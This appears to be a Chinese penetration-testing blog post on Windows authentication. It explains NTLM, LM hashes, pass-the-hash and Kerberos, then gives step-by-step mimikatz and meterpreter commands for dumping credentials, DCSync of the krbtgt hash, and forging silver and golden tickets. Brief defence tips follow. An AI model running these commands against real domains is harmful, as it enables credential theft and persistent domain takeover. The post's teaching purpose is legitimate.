@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这些技术分别能够满足我们在渗透中持续的维持权限、提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows基本认证">
+<meta property="og:url" content="http://example.com/2021/04/22/Windows%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/index.html">
+<meta property="og:site_name" content="Beytagh&#39;s blog">
+<meta property="og:description" content="这些技术分别能够满足我们在渗透中持续的维持权限、提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413154220554.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413160747096.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413164430195.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413171101807.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210414104321718.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210414104850433.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210418154131994.png">
+<meta property="article:published_time" content="2021-04-22T02:53:35.697Z">
+<meta property="article:modified_time" content="2021-08-14T11:41:43.844Z">
+<meta property="article:author" content="Beytagh">
+<meta property="article:tag" content="Windows基本认证">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413154220554.png">
+
+<link rel="canonical" href="http://example.com/2021/04/22/Windows%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows基本认证 | Beytagh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Beytagh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">PWN oh!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fas fa-users fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/22/Windows%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/beytagh.jpg">
+      <meta itemprop="name" content="Beytagh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Beytagh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows基本认证
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-22 10:53:35" itemprop="dateCreated datePublished" datetime="2021-04-22T10:53:35+08:00">2021-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-14 19:41:43" itemprop="dateModified" datetime="2021-08-14T19:41:43+08:00">2021-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这些技术分别能够满足我们在渗透中持续的维持权限、提权</p>
+<span id="more"></span>
+
+<h2 id="0x01-本地认证"><a href="#0x01-本地认证" class="headerlink" title="0x01 本地认证"></a>0x01 本地认证</h2><p>C:\WINDOWS\system32\config\sam</p>
+<p>对密码进行对比，相同则认证成功</p>
+<br/>
+
+
+
+
+
+
+
+
+
+<h3 id="NTLM（NT-LAN-Manager）Hash"><a href="#NTLM（NT-LAN-Manager）Hash" class="headerlink" title="NTLM（NT LAN Manager）Hash"></a>NTLM（NT LAN Manager）Hash</h3><ul>
+<li><p>NTLM Hash是支持Net NTLM认证协议并且是本地认证过程中重要的一部分</p>
+</li>
+<li><p>长度为32位，由数字与字母组成</p>
+</li>
+<li><p>Windows本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在SAM中</p>
+</li>
+<li><p>NTLM Hash前身是LM Hash目前基本淘汰</p>
+</li>
+<li><p>登录时就是将用户输入的明文加密后和sam中的NTLN Hash做比较</p>
+</li>
+</ul>
+<p><strong>NTLM Hash加密原理</strong></p>
+<p>admin-&gt;hex=61646d696e</p>
+<p>61646d696e-&gt;Unicode=610064006d0069006e00</p>
+<p>610064006d0069006e00-&gt;MD4=209C6174DA490CAEB422F3FA5A7AE634</p>
+<p>winlogon.exe是windows NT用户登录程序，用户管理用户登录退出</p>
+<p>lsass.exe用于微软windows系统的安全机制，本地安全和登录策略</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413154220554.png" alt="image-20210413154220554"></p>
+<p>winlogon接收用户的输入再交给lsass去认证</p>
+<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><ul>
+<li>将所有小写字母转换为大写字母</li>
+</ul>
+<blockquote>
+<p>123ABC（未达到7个字符）</p>
+</blockquote>
+<ul>
+<li>转换为16进制，分两组，填充14位字符，空余使用0x00填充</li>
+</ul>
+<blockquote>
+<p>31323341424300000000000000</p>
+</blockquote>
+<ul>
+<li>分割为两组7个字节的块</li>
+</ul>
+<blockquote>
+<p>31323341424300 00000000000（十六进制）</p>
+</blockquote>
+<ul>
+<li>每组转化为比特流，不足56Bit则在左边加0</li>
+</ul>
+<p>31323341424300（十六进制转化为二进制）</p>
+<p>110001001100100011001101000001010000100100001100000000（不足56Bit）</p>
+<blockquote>
+<p>00110001001100100011001101000001010000100100001100000000</p>
+</blockquote>
+<p>比特流按照7比特一组，分出8组，末尾加0</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413160747096.png" alt="image-20210413160747096"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0011000 0</span><br><span class="line">1001100 0</span><br><span class="line">1000110 0</span><br><span class="line">0110100 0</span><br><span class="line">0001010 0</span><br><span class="line">0001001 0</span><br><span class="line">0000110 0</span><br><span class="line">0000000 0</span><br></pre></td></tr></table></figure>
+
+
+
+<p>密码没有达到七位，导致后面都是0</p>
+<p>密码不超过7字节的，后面的一半都是固定的</p>
+<p>由此也可以用来判断用户的密码是否超过7个字节 </p>
+<h2 id="0x02-网络认证"><a href="#0x02-网络认证" class="headerlink" title="0x02 网络认证"></a>0x02 网络认证</h2><p>LM协议只能通过LM Hash去认证，NTLM协议只能通过NTLM Hash去认证</p>
+<p>目前主流的Windows网络认证都是NTLM v2</p>
+<p>隶属于工作组的机器之间无法相互建立一个完美的信任机制，只能点对点</p>
+<p>是比较落后的认证方式，没有<strong>信托机构</strong></p>
+<h3 id="NTLM（NT-LAN-Manager）"><a href="#NTLM（NT-LAN-Manager）" class="headerlink" title="NTLM（NT LAN Manager）"></a>NTLM（NT LAN Manager）</h3><p>早期SMB协议在网络上传输明文口令</p>
+<p>LAN Manager Challenge/Response验证机制，简称LM</p>
+<p>但是由于他过于简单以至于很容易就被破解</p>
+<p>于是微软提出了WindowsNT挑战/响应验证机制，称为NTLM</p>
+<p>SMB提供的只是对文件的服务，对服务的增删改，在服务上还是要依赖NTLM</p>
+<p>现在更新至NTLMv2以及Kerberos验证体系</p>
+<h4 id="挑战（Challenge）-响应（Response）"><a href="#挑战（Challenge）-响应（Response）" class="headerlink" title="挑战（Challenge）/响应（Response）"></a>挑战（Challenge）/响应（Response）</h4><p><strong>协商-&gt;质询-&gt;验证</strong></p>
+<p>旧版的Windows可能只支持LM，这时就需要协商</p>
+<p>第一步协商：</p>
+<ul>
+<li>客户端主要在这一步向服务器确认协议的版本，v1或v2</li>
+</ul>
+<p>第二步质询：</p>
+<ul>
+<li><p>客户端向服务器端发送用户名信息（用户名）请求</p>
+</li>
+<li><p>服务器接受到请求，生成一个16位的随机数，称之为Challenge，使用登录用户名对应的NTLM Hash加密Challenge（16位随机字符），生成Challenge1。同时将Challenge（16位随机字符）发送给客户端</p>
+</li>
+<li><p>客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端</p>
+</li>
+</ul>
+<p>第三步验证：</p>
+<ul>
+<li>服务器端收到客户端的Response后，对比Chanllenge1与Response是否相同，若相同则认证通过</li>
+</ul>
+<p><strong>流程图</strong></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413164430195.png" alt="image-20210413164430195"></p>
+<h3 id="NTLM-v2协议"><a href="#NTLM-v2协议" class="headerlink" title="NTLM v2协议"></a>NTLM v2协议</h3><p>NTLM v1与v2最显著的区别就是Challenge与加密算法不同</p>
+<p>共同点就是加密的原料都是NTLM Hash</p>
+<p>Challage：v1的Challenge有8位，v2的Challenge为16位</p>
+<p>Net-NTLM Hash：v1的主要加密算法是DES，v2的主要加密算法是HMAC-MD5</p>
+<p>Responder：在服务端伪造开启支持NTLMv1,v2协议认证的工具（可以获取用户的NTLM Hash）</p>
+<p>smbexec</p>
+<h2 id="0x03-Pass-The-Hash（哈希传递）"><a href="#0x03-Pass-The-Hash（哈希传递）" class="headerlink" title="0x03 Pass The Hash（哈希传递）"></a>0x03 Pass The Hash（哈希传递）</h2><p>能够在不需要账户明文密码的情况下完成认证的一种技术</p>
+<p>原理分析：</p>
+<p>需要客户端将自己需要参与认证的用户名发送至服务器，等待服务器给出Challenge</p>
+<p><strong>其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的Chanllenge加密生成一个Response，来完成认证</strong></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210413171101807.png" alt="image-20210413171101807"></p>
+<h2 id="0x04-域认证"><a href="#0x04-域认证" class="headerlink" title="0x04 域认证"></a>0x04 域认证</h2><p>Active Directory（活动目录）安装在域控中，是必不可少的一个服务</p>
+<p>Kerberos域网络认证体系，基于密钥系统为客户机/服务器应用提供强大的认证体系</p>
+<h3 id="kerberos域认证"><a href="#kerberos域认证" class="headerlink" title="kerberos域认证"></a>kerberos域认证</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享文件）执行认证服务的。</p>
+<p>域认证参与的角色</p>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC 密钥分发中心（Key Distribution Center）= DC（域控）</li>
+</ul>
+<p>KDC也就是域控</p>
+<p>介绍几个专有名词：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.KDC （key distributed center ）    	用于票据生成管理服务，它包含AS与TGS</span><br><span class="line">2.AS （authentication service）      	为客户端生成TGT</span><br><span class="line">3.TGS（ticket granting service）    	为客户端生成某个服务的ticket</span><br><span class="line">4.AD（account database）				存储客户端白名单，只有白名单中的才能申请TGT</span><br><span class="line">5.TGT（ticket granting ticket）      	用于获取ticket的一种票据</span><br><span class="line">6.SK（session key）					用户与域控的加密秘钥</span><br><span class="line">7.client							想访问某个server的客户端</span><br><span class="line">8.server                            提供某种业务的服务</span><br></pre></td></tr></table></figure>
+
+<p>一般来说，kerberos是用于域环境中身份认证的</p>
+<p>所以KDC通常都安装在域控中</p>
+<p>从物理层面来看，AD 和 KDC都是”域控”</p>
+<p>KDC当中有个krbtgt用户，在域控中net user会看到</p>
+<p>krbtgt是个系统自建用户，不用于登录，发票据的时候会用到其NTML HASH</p>
+<p>AD：存储所有Client的白名单，只有存在白名单的Client才能顺利申请到TGT</p>
+<blockquote>
+<p>AS：为Client生成TGT的服务</p>
+<p>TGS：为Client生成某个服务的ticket</p>
+</blockquote>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210414104321718.png" alt="image-20210414104321718"></p>
+<p>AD与KDC均为域控制器</p>
+<h3 id="域认证大致流程"><a href="#域认证大致流程" class="headerlink" title="域认证大致流程"></a>域认证大致流程</h3><ol>
+<li>Client 上的用户请求KDC服务，向AS服务生产TGT，返回给Client（AS会判断用户是否存在白名单中）</li>
+<li>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据（TGS会根据TGT判断是否有权限访问）</li>
+<li>Client使用ST（TGS Ticket）访问Server</li>
+</ol>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210414104850433.png" alt="image-20210414104850433"></p>
+<h3 id="域认证详细流程"><a href="#域认证详细流程" class="headerlink" title="域认证详细流程"></a>域认证详细流程</h3><p><strong>第一步，获取TGT：</strong></p>
+<p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p>
+<p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p>
+<p>注意：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt的hash，这就是<strong>伪造黄金票据的原理</strong></p>
+<p><strong>第二步，使用TGT获取Ticket：</strong></p>
+<p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p>
+<p>如果假设这个数据被中间人窃取到，也无法在段时间内利用，因为KDC会校验时间戳。</p>
+<p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p>
+<p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p>
+<p>注意：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p>
+<p><strong>第三步，使用Ticket访问Server：</strong></p>
+<p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p>
+<p>1.Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p>
+<p>2.服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p>
+<p>3.用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p>
+<p><strong>其中白银票据的伪造就发生在这一步的认证中</strong></p>
+<h2 id="0x05-伪造白银票据（Silver-Ticket）"><a href="#0x05-伪造白银票据（Silver-Ticket）" class="headerlink" title="0x05 伪造白银票据（Silver Ticket）"></a>0x05 伪造白银票据（Silver Ticket）</h2><p>白银票据前提：</p>
+<ul>
+<li>1.不需要与KDC进行交互，直接和server认证</li>
+<li>2.需要目标服务的NTLM Hash</li>
+</ul>
+<p>在第三步认证中的Ticket的组成：</p>
+<blockquote>
+<p>Ticket=Server Hash(Server Session Key+Client info+End Time) </p>
+</blockquote>
+<p>白银票据原理：</p>
+<ul>
+<li>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</li>
+</ul>
+<p>注意：</p>
+<p>​        服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p>
+<p><strong>白银票据伪造</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mimikatz</span><br><span class="line">kerberos::list 			列出票据</span><br><span class="line">kerberos::purge 		清除票据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">导出Server Hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; log.txt</span><br><span class="line"></span><br><span class="line">或者MSF模块导出Hash</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开始伪造票据</span><br><span class="line">伪造文件共享（SMB服务对应的是CIFS）白银票据权限流程</span><br><span class="line"></span><br><span class="line">一、</span><br><span class="line">CMD：klist purge     清空当前系统票据</span><br><span class="line"></span><br><span class="line">二、</span><br><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br><span class="line"></span><br><span class="line">三、</span><br><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br><span class="line">&lt;用户名&gt;可以随意填写，因为不会再向AD验证用户是否真实</span><br><span class="line"></span><br><span class="line">四、</span><br><span class="line">dir \\DC\c$     验证权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于白银票据需要目标服务器的Hash，所以没有办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器上某些服务去伪造</p>
+<p>伪造服务类型列表</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210418154131994.png" alt="image-20210418154131994"></p>
+<p>DCSync用于域同步，可以利用DCSync导出域内所有用户hash的方法</p>
+<p>白银票据防御</p>
+<ol>
+<li><p>尽量保证服务器凭证不被窃取</p>
+</li>
+<li><p>开启PAC（Privileged Attribute Certificate）特权属性证书保护功能，PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效</p>
+<p>开启PAC方法将注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters中ValidateKdcPacSignature设置为1</p>
+</li>
+</ol>
+<blockquote>
+<p>如果开启PAC，客户端在发送给服务端伪造的票据时，服务端会发送给KDC验证，此时KDC就会验证到该票据无效</p>
+</blockquote>
+<h2 id="0x06-伪造黄金票据（Golden-Ticket）"><a href="#0x06-伪造黄金票据（Golden-Ticket）" class="headerlink" title="0x06 伪造黄金票据（Golden Ticket）"></a>0x06 伪造黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p>
+<ul>
+<li>1.需要与DC通信</li>
+<li>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</li>
+</ul>
+<p>黄金票据原理：</p>
+<ul>
+<li><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p>
+<p>拿到KDC hash去伪造TGT去申请不同服务器的Ticket，再用Ticket去访问相应服务器</p>
+</li>
+</ul>
+<p>krbtgt hash就是KDC hash</p>
+<p><strong>伪造黄金票据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all     获取域名</span><br><span class="line">whoami &#x2F;all       获取SID</span><br><span class="line">mimikatz          获取krbtgt用户的NTLM哈希</span><br><span class="line">lsadump::dcsync &#x2F;domain:domain.com &#x2F;user:krbtgt</span><br><span class="line"></span><br><span class="line">CMD：klist purge       删除票据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用MSF伪造黄金票据</span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kerberos_ticket_list</span><br><span class="line"></span><br><span class="line">生成票据</span><br><span class="line">meterpreter &gt; golden_ticket_create -d &lt;域名&gt; -k &lt;krbtgt hash&gt; -s &lt;域SID&gt; -u &lt;任意用户名&gt; -t &lt;导出票据路径(kali机器下)&gt;</span><br><span class="line"></span><br><span class="line">加载票据</span><br><span class="line">meterpreter &gt; kerberos_ticket_use &#x2F;tmp&#x2F;krbtgt.ticket</span><br><span class="line"></span><br><span class="line">加载成功后可以使用CMD wmic创建一个进程 或者其他操作</span><br><span class="line">CMD：wmic &#x2F;authority:&quot;kerberos:PAYLOADS\cmp1&quot; &#x2F;node:cmp1 process call create calc.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz伪造票据</span><br><span class="line">一、获取krbtgt hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br><span class="line"></span><br><span class="line">二、获取域中所有用户SID</span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">三、清空现有票据</span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br><span class="line"></span><br><span class="line">四、生成票据</span><br><span class="line">mimikatz &quot;kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;krbtgt hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br><span class="line">还有一个简单的用法cobalt strike中直接有一项黄金票据生产 十分方便</span><br><span class="line"></span><br><span class="line">五、将票据注入内存</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br><span class="line"></span><br><span class="line">查看当前会话中的票据</span><br><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br><span class="line"></span><br><span class="line">六、权限验证（此时可以访问域内任何需要kerberos认证的服务）</span><br><span class="line">dir \\DC\c$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="0x07-Tickets（票据）总结"><a href="#0x07-Tickets（票据）总结" class="headerlink" title="0x07 Tickets（票据）总结"></a>0x07 Tickets（票据）总结</h2><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><ul>
+<li>访问权限：伪造TGT，可以获取任何Kerberos服务权限</li>
+<li>加密方式：由Kerberos的Hash加密</li>
+<li>认证流程：需要访问域控认证，属于第二步认证</li>
+</ul>
+<p>获取到krbtgt用户的hash后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限，使用黄金票据能在一个域环境中长时间控制整个域。</p>
+<p><strong>防御</strong></p>
+<ul>
+<li>经常更新krbtgt的密码，最根本的办法是不允许域管账户登录其他服务器</li>
+</ul>
